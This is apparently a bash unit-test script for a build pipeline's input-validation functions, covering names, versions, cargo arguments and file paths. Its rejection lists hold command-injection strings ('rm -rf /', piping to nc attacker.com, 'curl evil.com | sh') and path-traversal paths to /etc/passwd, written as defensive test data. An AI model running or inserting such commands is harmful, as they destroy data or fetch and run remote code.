#!/bin/bash

# Unit Test Script for /scripts folder functions
# Tests individual shell scripts and validation functions

set -euo pipefail

# Color codes for output
readonly RED='\033[0;31m'
readonly GREEN='\033[0;32m'
readonly YELLOW='\033[1;33m'
readonly BLUE='\033[0;34m'
readonly NC='\033[0m' # No Color

# Test configuration
readonly SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
readonly SCRIPTS_DIR="$SCRIPT_DIR/scripts"
readonly TEST_DIR="$SCRIPT_DIR/test-results"
readonly TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
readonly LOG_FILE="$TEST_DIR/scripts_test_log_$TIMESTAMP.log"

# Test counters
TESTS_TOTAL=0
TESTS_PASSED=0
TESTS_FAILED=0

# Source validation functions
if [[ -f "$SCRIPTS_DIR/validate-inputs.sh" ]]; then
    source "$SCRIPTS_DIR/validate-inputs.sh"
else
    echo -e "${RED}Error: validate-inputs.sh not found in $SCRIPTS_DIR${NC}"
    exit 1
fi

# Logging function
log() {
    local level="$1"
    shift
    local message="$*"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo "[$timestamp] [$level] $message" | tee -a "$LOG_FILE"
}

# Test result tracking
test_start() {
    local test_name="$1"
    ((TESTS_TOTAL++))
    log "INFO" "Starting test: $test_name"
    echo -e "${BLUE}🧪 Testing: $test_name${NC}"
}

test_pass() {
    local test_name="$1"
    ((TESTS_PASSED++))
    log "PASS" "$test_name"
    echo -e "${GREEN}✅ PASS: $test_name${NC}"
}

test_fail() {
    local test_name="$1"
    local error_msg="$2"
    ((TESTS_FAILED++))
    log "FAIL" "$test_name - $error_msg"
    echo -e "${RED}❌ FAIL: $test_name${NC}"
    echo -e "${RED}   Error: $error_msg${NC}"
}

# Test binary name validation
test_validate_binary_name() {
    test_start "Binary Name Validation"
    
    # Valid test cases
    local valid_names=(
        "my-app"
        "rust_tool"
        "app123"
        "my-awesome-cli-tool"
        "a"
        "ABC_123-xyz"
    )
    
    # Invalid test cases
    local invalid_names=(
        ""  # empty
        "app with spaces"  # spaces
        "app@123"  # special chars
        "$(printf 'a%.0s' {1..51})"  # too long
        "con"  # reserved name
        "prn"  # reserved name
        "app/name"  # slash
        "app;rm"  # dangerous chars
    )
    
    local failed_tests=0
    
    # Test valid names
    for name in "${valid_names[@]}"; do
        if ! validate_binary_name "$name" &>/dev/null; then
            echo -e "${RED}  Failed to validate valid name: '$name'${NC}"
            ((failed_tests++))
        fi
    done
    
    # Test invalid names
    for name in "${invalid_names[@]}"; do
        if validate_binary_name "$name" &>/dev/null; then
            echo -e "${RED}  Incorrectly validated invalid name: '$name'${NC}"
            ((failed_tests++))
        fi
    done
    
    if [[ $failed_tests -eq 0 ]]; then
        test_pass "Binary Name Validation"
    else
        test_fail "Binary Name Validation" "$failed_tests validation errors"
    fi
}

# Test platform name validation
test_validate_platform_name() {
    test_start "Platform Name Validation"
    
    # Valid test cases
    local valid_platforms=(
        "linux-x86_64"
        "mac-arm64"
        "windows-x86_64"
        "linux-arm64-musl"
        "freebsd-x86_64"
    )
    
    # Invalid test cases
    local invalid_platforms=(
        ""  # empty
        "linux x86_64"  # spaces
        "linux@x86_64"  # special chars
        "$(printf 'a%.0s' {1..31})"  # too long
        "linux/x86_64"  # slash
        "linux;x86_64"  # dangerous chars
    )
    
    local failed_tests=0
    
    # Test valid platforms
    for platform in "${valid_platforms[@]}"; do
        if ! validate_platform_name "$platform" &>/dev/null; then
            echo -e "${RED}  Failed to validate valid platform: '$platform'${NC}"
            ((failed_tests++))
        fi
    done
    
    # Test invalid platforms
    for platform in "${invalid_platforms[@]}"; do
        if validate_platform_name "$platform" &>/dev/null; then
            echo -e "${RED}  Incorrectly validated invalid platform: '$platform'${NC}"
            ((failed_tests++))
        fi
    done
    
    if [[ $failed_tests -eq 0 ]]; then
        test_pass "Platform Name Validation"
    else
        test_fail "Platform Name Validation" "$failed_tests validation errors"
    fi
}

# Test repository validation
test_validate_repository() {
    test_start "Repository Validation"
    
    # Valid test cases
    local valid_repos=(
        "user/repo"
        "organization/my-project"
        "user123/repo_name"
        "my-org/project-v2"
        "a/b"
    )
    
    # Invalid test cases
    local invalid_repos=(
        ""  # empty
        "user"  # missing slash
        "user/"  # missing repo
        "/repo"  # missing user
        "user/repo/extra"  # too many parts
        "user repo/name"  # spaces
        "user@org/repo"  # special chars
        "user/repo/../other"  # path traversal
        "$(printf 'a%.0s' {1..101})"  # too long
    )
    
    local failed_tests=0
    
    # Test valid repositories
    for repo in "${valid_repos[@]}"; do
        if ! validate_repository "$repo" &>/dev/null; then
            echo -e "${RED}  Failed to validate valid repo: '$repo'${NC}"
            ((failed_tests++))
        fi
    done
    
    # Test invalid repositories
    for repo in "${invalid_repos[@]}"; do
        if validate_repository "$repo" &>/dev/null; then
            echo -e "${RED}  Incorrectly validated invalid repo: '$repo'${NC}"
            ((failed_tests++))
        fi
    done
    
    if [[ $failed_tests -eq 0 ]]; then
        test_pass "Repository Validation"
    else
        test_fail "Repository Validation" "$failed_tests validation errors"
    fi
}

# Test version tag validation
test_validate_version_tag() {
    test_start "Version Tag Validation"
    
    # Valid test cases
    local valid_versions=(
        "v1.0.0"
        "1.2.3"
        "v2.0.0-beta.1"
        "1.0.0-alpha"
        "v3.0.0-rc.1"
        "1.0.0+build.123"
        "v2.1.0-beta.2+build.456"
        "0.1.0"
        "v10.20.30"
    )
    
    # Invalid test cases
    local invalid_versions=(
        ""  # empty
        "v"  # just v
        "invalid"  # not semver
        "$(printf 'a%.0s' {1..51})"  # too long
        "1.2.3;rm"  # dangerous chars
        "version with spaces"  # spaces
        "1.2.3@beta"  # invalid characters
        "1..2.3"  # double dots
        "1.2.3--beta"  # double dashes
    )
    
    local failed_tests=0
    
    # Test valid versions
    for version in "${valid_versions[@]}"; do
        if ! validate_version_tag "$version" &>/dev/null; then
            echo -e "${RED}  Failed to validate valid version: '$version'${NC}"
            ((failed_tests++))
        fi
    done
    
    # Test invalid versions
    for version in "${invalid_versions[@]}"; do
        if validate_version_tag "$version" &>/dev/null; then
            echo -e "${RED}  Incorrectly validated invalid version: '$version'${NC}"
            ((failed_tests++))
        fi
    done
    
    if [[ $failed_tests -eq 0 ]]; then
        test_pass "Version Tag Validation"
    else
        test_fail "Version Tag Validation" "$failed_tests validation errors"
    fi
}

# Test cargo args validation
test_validate_cargo_args() {
    test_start "Cargo Args Validation"
    
    # Valid test cases
    local valid_args=(
        ""  # empty is ok
        "--release"
        "--release --features full"
        "--target x86_64-unknown-linux-gnu"
        "--bin my-app --release"
        "--features serde,tokio --release"
    )
    
    # Invalid test cases (dangerous/malicious)
    local invalid_args=(
        "--release; rm -rf /"  # command injection
        "--release | nc attacker.com 8080"  # pipe
        "--release && curl evil.com"  # command chaining
        "--release \$(whoami)"  # command substitution
        "--release --features \`id\`"  # backticks
        "$(printf 'a%.0s' {1..201})"  # too long
        "--release > /etc/passwd"  # redirection
        "--release < /etc/passwd"  # redirection
        "--release (echo hi)"  # parentheses
        "rm -rf /; --release"  # dangerous pattern
        "curl evil.com | sh"  # dangerous pattern
    )
    
    local failed_tests=0
    
    # Test valid args
    for args in "${valid_args[@]}"; do
        if ! validate_cargo_args "$args" &>/dev/null; then
            echo -e "${RED}  Failed to validate valid args: '$args'${NC}"
            ((failed_tests++))
        fi
    done
    
    # Test invalid args
    for args in "${invalid_args[@]}"; do
        if validate_cargo_args "$args" &>/dev/null; then
            echo -e "${RED}  Incorrectly validated dangerous args: '$args'${NC}"
            ((failed_tests++))
        fi
    done
    
    if [[ $failed_tests -eq 0 ]]; then
        test_pass "Cargo Args Validation"
    else
        test_fail "Cargo Args Validation" "$failed_tests validation errors"
    fi
}

# Test rust version validation
test_validate_rust_version() {
    test_start "Rust Version Validation"
    
    # Valid test cases
    local valid_versions=(
        "stable"
        "beta"
        "nightly"
        "1.75.0"
        "1.70"
        "1.68.2"
    )
    
    # Invalid test cases
    local invalid_versions=(
        ""  # empty
        "invalid"  # not a valid channel/version
        "1"  # incomplete version
        "stable-2023"  # invalid format
        "1.75.0.1"  # too many parts
        "v1.75.0"  # with v prefix
        "$(printf 'a%.0s' {1..21})"  # too long
        "1.75.0; rm -rf /"  # injection attempt
    )
    
    local failed_tests=0
    
    # Test valid versions
    for version in "${valid_versions[@]}"; do
        if ! validate_rust_version "$version" &>/dev/null; then
            echo -e "${RED}  Failed to validate valid rust version: '$version'${NC}"
            ((failed_tests++))
        fi
    done
    
    # Test invalid versions
    for version in "${invalid_versions[@]}"; do
        if validate_rust_version "$version" &>/dev/null; then
            echo -e "${RED}  Incorrectly validated invalid rust version: '$version'${NC}"
            ((failed_tests++))
        fi
    done
    
    if [[ $failed_tests -eq 0 ]]; then
        test_pass "Rust Version Validation"
    else
        test_fail "Rust Version Validation" "$failed_tests validation errors"
    fi
}

# Test file path validation
test_validate_file_path() {
    test_start "File Path Validation"
    
    # Create temporary test directory
    local temp_dir="$TEST_DIR/temp_file_test_$TIMESTAMP"
    mkdir -p "$temp_dir"
    
    # Valid test cases (relative to temp_dir)
    local valid_paths=(
        "file.txt"
        "subdir/file.txt"
        "my-file_123.bin"
        "deep/nested/path/file.txt"
    )
    
    # Invalid test cases
    local invalid_paths=(
        ""  # empty
        "../../../etc/passwd"  # path traversal
        "/etc/passwd"  # absolute path
        "file/../../../etc/passwd"  # traversal in middle
        "../file.txt"  # simple traversal
    )
    
    local failed_tests=0
    
    # Test valid paths
    for path in "${valid_paths[@]}"; do
        if ! validate_file_path "$path" "$temp_dir" &>/dev/null; then
            echo -e "${RED}  Failed to validate valid path: '$path'${NC}"
            ((failed_tests++))
        fi
    done
    
    # Test invalid paths
    for path in "${invalid_paths[@]}"; do
        if validate_file_path "$path" "$temp_dir" &>/dev/null; then
            echo -e "${RED}  Incorrectly validated dangerous path: '$path'${NC}"
            ((failed_tests++))
        fi
    done
    
    # Cleanup
    rm -rf "$temp_dir"
    
    if [[ $failed_tests -eq 0 ]]; then
        test_pass "File Path Validation"
    else
        test_fail "File Path Validation" "$failed_tests validation errors"
    fi
}

# Test shell escaping functions
test_shell_escaping() {
    test_start "Shell Escaping Functions"
    
    # Test escape_for_shell function
    local test_strings=(
        "simple"
        "with spaces"
        "with'quotes"
        'with"double'
        "with\$dollar"
        "with;semicolon"
        "with|pipe"
        "with&ampersand"
    )
    
    local failed_tests=0
    
    for test_string in "${test_strings[@]}"; do
        local escaped
        escaped=$(escape_for_shell "$test_string")
        
        # Verify the escaped string is safe to use in shell
        # This is a basic test - in real use, the escaped string should be safe
        if [[ -z "$escaped" ]]; then
            echo -e "${RED}  Escaping failed for: '$test_string'${NC}"
            ((failed_tests++))
        fi
    done
    
    if [[ $failed_tests -eq 0 ]]; then
        test_pass "Shell Escaping Functions"
    else
        test_fail "Shell Escaping Functions" "$failed_tests escaping errors"
    fi
}

# Test matrix generation script
test_matrix_generation() {
    test_start "Matrix Generation Script"
    
    if [[ ! -f "$SCRIPTS_DIR/generate-matrix.sh" ]]; then
        test_fail "Matrix Generation Script" "Script not found: $SCRIPTS_DIR/generate-matrix.sh"
        return
    fi
    
    # Test basic matrix generation
    local matrix_output
    if matrix_output=$("$SCRIPTS_DIR/generate-matrix.sh" 2>&1); then
        # Check if output contains expected platforms
        if echo "$matrix_output" | grep -q "linux-x86_64" && \
           echo "$matrix_output" | grep -q "mac-arm64" && \
           echo "$matrix_output" | grep -q "windows-x86_64"; then
            test_pass "Matrix Generation Script"
        else
            test_fail "Matrix Generation Script" "Matrix missing expected platforms"
        fi
    else
        test_fail "Matrix Generation Script" "Script execution failed: $matrix_output"
    fi
}

# Test all script files exist
test_script_files_exist() {
    test_start "Required Script Files"
    
    local required_scripts=(
        "validate-inputs.sh"
        "generate-matrix.sh"
        "create-checksums.sh"
        "setup-cross-compilation.sh"
    )
    
    local missing_scripts=0
    
    for script in "${required_scripts[@]}"; do
        if [[ ! -f "$SCRIPTS_DIR/$script" ]]; then
            echo -e "${RED}  Missing script: $script${NC}"
            ((missing_scripts++))
        else
            # Check if script is executable
            if [[ ! -x "$SCRIPTS_DIR/$script" ]]; then
                echo -e "${YELLOW}  Script not executable: $script${NC}"
            fi
        fi
    done
    
    if [[ $missing_scripts -eq 0 ]]; then
        test_pass "Required Script Files"
    else
        test_fail "Required Script Files" "$missing_scripts scripts missing"
    fi
}

# Generate test report
generate_report() {
    echo -e "\n${BLUE}📊 Scripts Test Report${NC}"
    echo "=================================="
    echo "Total Tests: $TESTS_TOTAL"
    echo -e "Passed: ${GREEN}$TESTS_PASSED${NC}"
    echo -e "Failed: ${RED}$TESTS_FAILED${NC}"
    echo "Success Rate: $(( TESTS_PASSED * 100 / TESTS_TOTAL ))%"
    echo "Log file: $LOG_FILE"
    echo "=================================="
    
    if [[ $TESTS_FAILED -eq 0 ]]; then
        echo -e "${GREEN}🎉 All script tests passed!${NC}"
        return 0
    else
        echo -e "${RED}❌ Some script tests failed. Check the log for details.${NC}"
        return 1
    fi
}

# Main test execution
main() {
    echo -e "${BLUE}🚀 Starting Scripts Unit Tests${NC}"
    echo "Timestamp: $(date)"
    echo "Scripts directory: $SCRIPTS_DIR"
    echo "Log file: $LOG_FILE"
    echo ""
    
    # Create test directory
    mkdir -p "$TEST_DIR"
    
    # Run test suites
    echo -e "\n${BLUE}🧪 Running Script Unit Tests${NC}"
    echo "=================================="
    
    test_script_files_exist
    test_validate_binary_name
    test_validate_platform_name
    test_validate_repository
    test_validate_version_tag
    test_validate_cargo_args
    test_validate_rust_version
    test_validate_file_path
    test_shell_escaping
    test_matrix_generation
    
    # Generate final report
    echo ""
    generate_report
}

# Script entry point
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi